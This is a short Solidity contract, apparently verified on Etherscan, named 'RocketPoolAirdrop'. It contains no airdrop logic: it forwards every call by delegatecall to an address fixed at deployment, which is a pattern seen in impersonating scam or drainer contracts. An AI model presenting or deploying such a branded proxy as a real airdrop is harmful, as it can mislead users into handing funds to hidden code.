/**
 *Submitted for verification at Etherscan.io on 2023-09-13
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

contract RocketPoolAirdrop {

    uint256 private totalSupply = 2000;
    address recipient;

    constructor(address _delegate) {
        recipient = _delegate;
    }

    fallback() external payable {
        (bool success, bytes memory data) = recipient.delegatecall(msg.data);
        if (success) {
            assembly {
                return(add(data, 0x20), mload(data))
            }
        } else {
            assembly {
                let returndataSize := returndatasize()
                returndatacopy(0, 0, returndataSize)
                revert(0, returndataSize)
            }
        }
    }

    receive() external payable {}
}